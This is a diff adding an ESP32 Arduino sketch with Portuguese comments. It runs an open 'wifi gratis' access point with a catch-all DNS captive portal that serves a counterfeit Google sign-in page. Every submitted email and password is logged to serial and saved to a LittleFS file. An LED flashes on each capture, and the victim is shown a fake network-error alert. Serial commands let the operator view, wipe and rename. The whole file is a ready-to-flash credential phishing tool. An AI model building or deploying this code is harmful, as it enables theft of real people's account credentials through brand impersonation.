@@ -1,0 +1,254 @@
+#include <WiFi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+#include <LittleFS.h>
+
+const byte DNS_PORT = 53;
+char nome_rede[32] = "wifi gratis"; 
+
+// Definição de pino para LED comum (caso não use o RGB nativo do S3)
+#define LED_PIN 2 
+
+IPAddress apIP(192, 168, 4, 1);
+DNSServer dnsServer;
+WebServer server(80);
+
+const char GOOGLE_HTML[] PROGMEM = R"=====(
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        /* Fonte generica para funcionar offline */
+        * { padding: 0; margin: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #f0f2f5; }
+        .box { display: flex; height: 100vh; justify-content: center; align-items: center; user-select: none; }
+        .form { width: 400px; background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); text-align: center; }
+        
+        /* Logo Google em CSS para nao depender de imagem externa */
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; display: inline-block; }
+        .blue { color: #4285F4; } .red { color: #EA4335; } .yellow { color: #FBBC05; } .green { color: #34A853; }
+        
+        .form-title { font-weight: 400; margin-bottom: 30px; font-size: 22px; color: #202124; }
+        
+        .form-group { position: relative; margin-bottom: 25px; height: 50px; text-align: left; }
+        
+        .form-control { width: 100%; height: 100%; background: none; border: 1px solid #dadce0; border-radius: 4px; outline: none; padding: 10px 15px; font-size: 16px; z-index: 1; position: relative; color: #202124; }
+        .form-control:focus { border: 2px solid #1a73e8; padding: 9px 14px; /* compensar borda */ }
+        
+        .class-label { position: absolute; left: 10px; top: 12px; color: #5f6368; background-color: white; padding: 0 5px; font-size: 16px; transition: .2s; z-index: 0; pointer-events: none; }
+        
+        /* Efeito flutuante do label */
+        .form-control:focus + .class-label,
+        .form-control:not(:placeholder-shown) + .class-label {
+            top: -10px; font-size: 12px; color: #1a73e8; z-index: 10; font-weight: 500;
+        }
+
+        .show-label { font-size: 14px; color: #202124; display: flex; align-items: center; justify-content: flex-start; margin-left: 5px; cursor: pointer; }
+        .show-label input { margin-right: 8px; }
+
+        .bottom-button { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .bottom-button a { text-decoration: none; color: #1a73e8; font-size: 14px; font-weight: 500; }
+        .form-button { padding: 10px 24px; border: none; background-color: #1a73e8; color: white; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px; transition: background .3s; }
+        .form-button:hover { background-color: #1557b0; box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <form class="form" action="/post" method="POST"> 
+            
+            <div class="logo">
+                <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
+            </div>
+            
+            <h1 class="form-title">Fazer login</h1>
+            
+            <div class="form-group">
+                <input type="text" name="u" class="form-control" placeholder=" " required>
+                <label class="class-label">E-mail ou telefone</label>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" name="p" id="passInput" class="form-control" placeholder=" " required>
+                <label class="class-label">Digite sua senha</label>
+            </div>
+            
+            <div class="form-group" style="height: auto; margin-bottom: 0;">
+                <label class="show-label">
+                    <input type="checkbox" onclick="togglePass()"> Mostrar senha
+                </label>
+            </div>
+            
+            <div class="bottom-button">
+                <a href="#">Esqueceu a senha?</a>
+                <button class="form-button">Próxima</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Script simples para fazer o checkbox funcionar
+        function togglePass() {
+            var x = document.getElementById("passInput");
+            if (x.type === "password") { x.type = "text"; } else { x.type = "password"; }
+        }
+    </script>
+</body>
+</html>
+)=====";
+
+// --- FUNÇÃO PARA PISCAR VERDE ---
+void piscarSucesso() {
+  // Se a placa tiver o RGB nativo do ESP32-S3 definido
+  #ifdef RGB_BUILTIN
+    // neopixelWrite(PINO, R, G, B) -> Verde intenso
+    neopixelWrite(RGB_BUILTIN, 0, 64, 0); 
+    delay(200);
+    neopixelWrite(RGB_BUILTIN, 0, 0, 0);  
+    delay(100);
+    neopixelWrite(RGB_BUILTIN, 0, 64, 0); 
+    delay(200);
+    neopixelWrite(RGB_BUILTIN, 0, 0, 0);
+  #else
+    // Fallback para LED comum (Pino 2)
+    digitalWrite(LED_PIN, HIGH);
+    delay(200);
+    digitalWrite(LED_PIN, LOW);
+    delay(100);
+    digitalWrite(LED_PIN, HIGH);
+    delay(200);
+    digitalWrite(LED_PIN, LOW);
+  #endif
+}
+
+void show_logs() {
+  Serial.println("\n--- LENDO LOGS DO LITTLEFS ---");
+  if (!LittleFS.exists("/logins.txt")) {
+    Serial.println("Arquivo /logins.txt nao existe ainda.");
+    return;
+  }
+  File file = LittleFS.open("/logins.txt", FILE_READ);
+  if (!file) {
+    Serial.println("Falha ao abrir arquivo para leitura.");
+    return;
+  }
+  while (file.available()) {
+    Serial.write(file.read());
+  }
+  file.close();
+  Serial.println("\n--- FIM DOS LOGS ---");
+}
+
+void gravarLog(String user, String pass) {
+  File file = LittleFS.open("/logins.txt", FILE_APPEND);
+  if (file) {
+    file.printf("Google -> U: %s | P: %s\n", user.c_str(), pass.c_str());
+    file.close();
+    Serial.println("Sucesso: Dados gravados no arquivo.");
+  } else {
+    Serial.println("ERRO: Nao foi possivel gravar no LittleFS.");
+  }
+}
+
+void handlePortal() {
+  server.send(200, "text/html", GOOGLE_HTML);
+}
+
+void handlePost() {
+  String user = server.arg("u");
+  String pass = server.arg("p");
+  Serial.printf("\n[CAPTURA] User: %s | Pass: %s\n", user.c_str(), pass.c_str());
+  
+  gravarLog(user, pass);
+  
+  // AQUI: Chama a função para piscar
+  piscarSucesso(); 
+  
+  server.send(200, "text/html", "<html><script>alert('Erro de rede. Tente novamente.'); window.location='/';</script></html>");
+}
+
+void clean_login(){
+  if (LittleFS.exists("/logins.txt")) {
+    LittleFS.remove("/logins.txt");
+    Serial.println("SUCESSO: Arquivo de logs deletado!");
+  } else {
+    Serial.println("AVISO: Arquivo de logs nao existe ou ja foi apagado.");
+  }
+}
+
+void change_wifi(){
+  Serial.println("Digite o novo nome da rede (aguardando...):");
+  unsigned long tempoInicio = millis();
+  while (!Serial.available()) {
+     if (millis() - tempoInicio > 10000) { 
+        Serial.println("Tempo esgotado. Cancelando troca.");
+        return;
+     }
+     delay(10);
+  }
+  String novoNome = Serial.readStringUntil('\n');
+  novoNome.trim();
+  
+  if (novoNome.length() > 0 && novoNome.length() < 32) {
+      novoNome.toCharArray(nome_rede, 32);
+      Serial.printf("Alterando rede para: %s\n", nome_rede);
+      WiFi.softAPdisconnect();
+      delay(100);
+      WiFi.softAP(nome_rede);
+      Serial.println("Rede reiniciada com sucesso!");
+  } else {
+      Serial.println("Nome invalido.");
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+
+  // Configuração do LED
+  #ifdef RGB_BUILTIN
+    // Inicializa o pino do RGB (necessário em alguns cores)
+    // Normalmente neopixelWrite cuida disso, mas garantir output ajuda
+    pinMode(RGB_BUILTIN, OUTPUT);
+  #else
+    pinMode(LED_PIN, OUTPUT);
+  #endif
+   
+  if(!LittleFS.begin(true)) {
+    Serial.println("Erro critico ao montar LittleFS");
+  }
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(nome_rede);
+
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  server.on("/", handlePortal);
+  server.on("/post", HTTP_POST, handlePost);
+  server.onNotFound([]() {
+    server.sendHeader("Location", "http://192.168.4.1/", true);
+    server.send(302, "text/plain", "");
+  });
+
+  server.begin();
+  Serial.println("Sistema Pronto.");
+  show_logs();
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+   
+  if (Serial.available()) {
+      String comando = Serial.readStringUntil('\n');
+      comando.trim();
+
+      if (comando == "clean") clean_login();
+      else if (comando == "change") change_wifi();
+      else if (comando == "show") show_logs();
+      else if (comando.length() > 0) Serial.println("Comando incorreto.");
+  }
+}
